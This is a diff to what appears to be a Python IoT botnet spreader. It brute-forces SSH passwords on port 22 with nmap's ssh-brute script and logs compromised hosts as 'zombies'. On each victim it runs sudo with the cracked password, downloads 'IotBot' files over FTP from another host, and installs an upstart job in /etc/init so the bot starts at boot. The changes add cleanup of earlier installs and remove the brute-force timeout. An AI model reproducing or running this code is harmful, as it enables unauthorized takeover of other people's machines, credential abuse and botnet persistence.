@@ -35,12 +35,15 @@ def sshLogin(user, ip, password):
         stdin.write(
             '''
         cd /home
+        echo ''' + password + '''| sudo -S echo exec [[ -d /home/kabali ]] && sudo -S rm -r /home/kabali
         echo ''' + password + '''| sudo -S mkdir kabali
         cd kabali 
         echo ''' + password + '''| sudo -S mkdir IotBot
         cd IotBot
         echo ''' + password + '''| sudo -S wget --user=user --password=abcd ftp://10.0.0.184:/IotBot/*
         
+        echo ''' + password + '''| sudo stop my
+        echo ''' + password + '''| sudo -S echo exec [[ -d /etc/init/my.conf ]] && sudo -S rm -r /etc/init/my.conf
         echo ''' + password + '''| sudo -S touch /etc/init/my.conf
         
         echo ''' + password + '''| sudo -S echo 'start on runlevel [234]' >> /etc/init/my.conf
@@ -65,7 +68,7 @@ def sshLogin(user, ip, password):
 def ssh(ip):
     threadSafePrint(bcolors.BOLD, bcolors.HEADER, " ************************* BRUTE FORCE LOGIN IS IN PROGRESS *****************", ip, bcolors.ENDC)
     zombies = openFile('zombies.txt', 'a')
-    scanner_t2.scan(hosts=ip, ports='22', arguments='--script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt  --script-args ssh-brute.timeout=8s')
+    scanner_t2.scan(hosts=ip, ports='22', arguments='--script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt')
 
     if scanner_t2[ip].state() == 'up':
         protocols = scanner_t2[ip].all_protocols()
